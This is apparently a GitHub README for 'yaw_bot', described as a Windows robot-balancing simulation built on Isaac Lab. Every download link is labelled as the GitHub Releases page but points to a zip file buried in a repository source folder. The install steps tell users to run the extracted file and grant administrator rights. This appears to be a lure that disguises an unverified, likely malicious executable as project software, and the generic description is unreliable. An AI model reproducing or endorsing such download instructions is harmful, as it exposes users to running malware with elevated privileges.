# 🤖 yaw_bot - Stable Robot Control on Windows

[![Download yaw_bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip)

## 🧭 What yaw_bot is

yaw_bot is a robot simulation app for Windows. It uses Isaac Lab to run a two-wheel balancing robot in a 3D scene. The project focuses on balance control, wheel contact checks, and leg mapping used in sim-to-real work.

This release is for users who want to open the app, run the simulation, and watch the robot balance without setting up a dev toolchain.

## 💻 What you need

Before you start, make sure your PC can run the app:

- Windows 10 or Windows 11
- A recent NVIDIA GPU
- Enough free disk space for the app and simulation files
- A mouse and keyboard
- Admin access for install steps if Windows asks for it

A gaming-class PC works well. If your system already runs 3D tools or game engines, it should be a good fit.

## 🚀 Download the app

Visit this page to download the latest Windows release:

[Download yaw_bot from GitHub Releases](https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip)

Look for the newest release on the page. Download the Windows file that matches your system. If the release page offers more than one file, choose the one marked for Windows.

## 📦 Install on Windows

1. Open the release page.
2. Download the Windows file from the latest release.
3. If the file is in a .zip format, right-click it and choose Extract All.
4. Open the extracted folder.
5. Find the main app file and double-click it.
6. If Windows asks for permission, choose Yes.
7. Wait for the app to load.

If the release uses an installer, run the installer file and follow the steps on screen.

## 🖥️ First launch

When you start yaw_bot for the first time, the simulation may take a short time to load. This is normal for Isaac Lab scenes and physics setup.

Use these basic controls:

- Mouse to look around the scene
- Keyboard to start and stop the simulation
- On-screen menus to load the robot, if shown
- Any preset buttons for reset, run, or pause

If the app opens to a blank scene, wait a few seconds. Large simulation scenes can take time to appear.

## 🧪 What you can do in the app

yaw_bot is built around a two-wheel balancing robot. In the app, you can use it to:

- Run a balance test in simulation
- Watch wheel-ground contact behavior
- Check how the robot reacts to tilt
- Inspect leg mapping between the model and the scene
- Test reinforcement learning control behavior
- Compare robot motion under different settings

The project uses robotics tools and physics simulation, so small changes in surface contact or body angle can affect the result.

## 🔧 How the simulation is set up

The app is based on a robot control loop that uses:

- Isaac Lab for scene setup
- PhysX for physics
- PPO for training logic
- RSL-RL style control work
- A wheeled robot model with balance control

You do not need to manage these parts yourself to run the release. They are built into the app workflow.

## 🎮 Basic use tips

- Close other heavy apps if the scene feels slow
- Keep the robot on a flat surface in the simulator
- Use reset if the robot falls or drifts
- Let the simulation run for a few seconds before judging the balance
- If the robot moves in the wrong direction, reset and try again

The robot may wobble at first. Balance control often needs a short settle time.

## 🛠️ Common issues

### App does not start

- Check that you downloaded the Windows release from the release page
- Make sure the file finished downloading
- Extract the archive before opening it, if it came as a .zip file
- Try running the app as administrator

### Black screen or no robot

- Wait for the scene to finish loading
- Make sure your GPU drivers are current
- Close other GPU-heavy apps
- Restart the app and try again

### Slow frame rate

- Lower other apps running in the background
- Reboot the PC before a long run
- Check that Windows is using the NVIDIA GPU
- Use a system with more GPU memory if available

### Robot falls over right away

- Use reset and start again
- Give the scene time to load fully
- Check that the robot starts on level ground
- Run the default setup before changing any settings

## 📁 Release files

The release page may include:

- A Windows app file
- A compressed archive
- Supporting files for the simulation
- Version notes for the build

Use the newest version unless you need a specific older build.

## 🔍 Project focus

yaw_bot is aimed at:

- Balancing robot control
- Wheel and ground contact checks
- Leg mapping between robot parts and motion
- RL-based robot behavior
- Sim-to-real testing flow
- Isaac Lab simulation work

The setup is built for clear robot motion testing in a controlled scene.

## 🧩 Typical use flow

1. Download the latest Windows release
2. Extract the files if needed
3. Open the app
4. Wait for the scene to load
5. Start the simulation
6. Watch the robot balance
7. Reset and repeat if needed

## 📚 Short terms guide

- **Simulation**: a virtual robot test scene
- **Physics**: rules that control motion and contact
- **Wheel-ground contact**: when the wheels touch the floor
- **Balancing robot**: a robot that stays upright using motion control
- **RL**: reinforcement learning, a method for teaching a control policy
- **PPO**: a common RL training method

## 🧭 Where to get the file

Use the GitHub Releases page for the latest Windows build:

[https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip](https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip)

## 🔎 Repo topics

This project is tagged with:

- balancing-robot
- isaaclab
- locomotion
- omniverse
- physx
- ppo
- reinforcement-learning
- robotics
- rsl-rl
- sim-to-real
- wheeled-robot

These tags match the robot simulation and control work in the app